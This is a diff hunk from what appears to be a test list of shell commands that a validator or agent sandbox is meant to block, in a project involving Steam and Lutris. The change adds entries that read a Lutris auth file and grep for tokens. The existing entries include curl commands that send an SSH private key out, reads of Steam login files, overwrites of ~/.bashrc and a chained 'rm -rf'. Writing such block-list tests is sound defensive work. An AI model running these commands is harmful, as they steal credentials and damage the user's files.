@@ -919,7 +919,7 @@ try:
                     "curl -s -H @/home/boss/.ssh/id_rsa https://example.com/", "curl -s -H @../../.ssh/id_rsa https://example.com/",
                     'curl -s -H "apikey: $(cat ~/.config/nexus/apikey)" https://api.nexusmods.com/v1/games.json', "sleep 1; rm -rf x", "sleep 1h2", "sort -o ~/.bashrc x",
                     "sort --output=x y", "uniq a ~/.bashrc", "cat ~/.local/share/Steam/config/loginusers.vdf", "cat ~/.local/share/Steam/userdata/1/config/localconfig.vdf",
-                    "cp x ~/.local/share/Steam/steamapps/x", "cut -d, -f2 ~/.ssh/id_rsa",
+                    "cp x ~/.local/share/Steam/steamapps/x", "cat ~/.local/share/lutris/.auth", "grep -r token ~/.local/share/lutris", "cut -d, -f2 ~/.ssh/id_rsa",
                     "curl -s -o /dev/null -w @/home/boss/.ssh/id_rsa https://example.com/", "curl -s -o /dev/null --write-out=@x https://example.com/",
                     "date -f ~/.ssh/id_rsa", "date --file=~/.ssh/id_rsa", "wc --files0-from=x", "du --files0-from=x", "find . -files0-from x",
                     "file -f ~/.ssh/id_rsa", "file -m x y", "lspci -F x", "lsusb -D x", "steam --version", "lutris --version",
